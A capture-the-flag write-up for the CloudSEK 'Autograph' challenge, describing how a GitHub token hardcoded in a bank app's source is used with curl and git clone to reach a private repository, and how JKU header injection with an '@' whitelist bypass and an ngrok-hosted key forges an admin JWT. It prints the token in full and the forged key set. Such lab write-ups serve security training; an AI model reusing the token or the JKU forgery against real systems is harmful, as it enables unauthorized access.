**Challenge Name : CSK-05-2024: Autograph**

**Points** : 50

**Description** : 

In continuation to the previous challenge, As now your team has identified the correct IAV(mobile application) that led to the breach, Your task is to analyse it, hack your way in and get the flag.

For your convience, The mobile application is already uploaded on BeVigil for analysis.

Your task is to perform the root cause analysis by reproducing the security vulnerability. Identify and exploit the security vulnerability to obtain the flag.

**Steps to solve** : 

Step 1: Read the description. This has some parts that are the same as the first challenge, where we have to visit BeVigil.com and search for the bank name that we got in the second challenge, or we can directly put it in the URL like this:

 https://bevigil.com/report/com.shbank.transferapp

![first](image.png)

![strings](image-1.png)

![git](image-2.png)

![token](image-3.png)

https://bevigil.com/src/com.shbank.transferapp/source%2Fsources%2Fcom%2Fshbank%2Ftransferapp%2FRepoFetch.java

Step 2: After searching all the files, I found a GitHub token which we can use to access private repositories on GitHub. For that, I used these commands:

`curl -H "Authorization: Bearer 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" https://api.github.com/user/repos`

![curl](image-4.png)

`git clone https://skyhighbank-staging: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@github.com/skyhighbank-staging/Transfer-API`

Step 3: The GitHub repository contains the source code for the webpage, which includes the IP and port of the live web server. As mentioned in the hints, the vulnerability is JKU header injection. There is a PortSwigger lab that is similar, with the only difference being the IP whitelist. To bypass that, you have to use **@**.



![clone](image-5.png)



Step 4: To get admin access, I watched a YouTube video by Intigriti, which helps to bypass JKU.

https://youtu.be/hMRdMmll8Bk?si=GCuJ5nBVi6bHM2QW

Step 5: I started an ngrok server to host a JSON key on the server and set up a Python HTTP server.






![ngrok](image-6.png)



![server](image-7.png)





JSON payload : 

`{
    "mykeys": [{
        "kty": "RSA",
        "e": "AQAB",
        "use": "sig",
        "kid": "f15a2c54-cfab-4e7f-ab17-a6a4ab11d575",
        "alg": "RS256",
        "n": "yiYEMHxOJqYJWLe83QV-71ehVpqZL5cIN3T79hMpnDUxPOhQPRPlO19BePs1ymMdsJQeXQYj1GbsTwPjETKVGT6FBWsOxQ3qexN3UwbAFUORV9U67GI30iUbEn-G_cQ7AbwCrQNs2J_lO7M69w419joKucratWbW4sXe1od3IjaP-2g2R08PE3SKZKCaDt39ZauIWGTcZZsykQ6OPiX1LAkpji8A8PY3zSPSvA9gzN7RVrfQlLwHkOgzfqMHhYI-Wn4jmbQJZGwF5TxQIBTqL42H1PxMW-Ahvq7WuR52b_mtJyONulvsbktMQQswFf-gaDk3qPgNEfNJpSG8HZoFvQ"
    }]

}`

Step 6: After this, using @, I placed the ngrok link after the original site link like this and changed "guest" to "admin."

![burp](image-8.png)

After sending this request, I got the flag.

![flag](image-9.png)


**Flag === CloudSEK{jku_4r3_fun}**